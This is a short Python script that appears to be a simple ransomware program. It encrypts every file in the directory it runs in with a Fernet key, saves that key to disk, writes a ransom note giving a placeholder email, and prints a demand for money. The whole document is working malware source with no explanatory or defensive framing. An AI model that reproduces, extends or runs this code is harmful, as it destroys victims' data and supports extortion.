#!/usr/bin/env python3



import os

import base64

from cryptography.fernet import Fernet





files = []



for file in os.listdir():

    if file in ["malware.py", "thekey.key", "decrypt.py", "ransom_note.txt", "malware"]:

        continue

    if os.path.isfile(file):

        files.append(file)





key = Fernet.generate_key()

encoded_key = base64.urlsafe_b64encode(key).decode('utf-8')


ransom_note = f"All of your files have been encrypted. To unlock them, contact me with your encryption code at this email: email@email.com. Your encryption code is: {encoded_key}"



ransom_note_path = "ransom_note.txt"



with open(ransom_note_path, "w") as note:

    note.write(ransom_note)



with open("thekey.key", "w") as secretkey:

    secretkey.write(encoded_key)



for file in files:
    try:
        with open(file, "rb") as thefile:

            contents = thefile.read()

        contents_encrypted = Fernet(key).encrypt(contents)

        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    except Exception as e:
        print(f"Error encrypting {file}: {e}")


print("All of your files are encrypted, send me money to decrypt them")

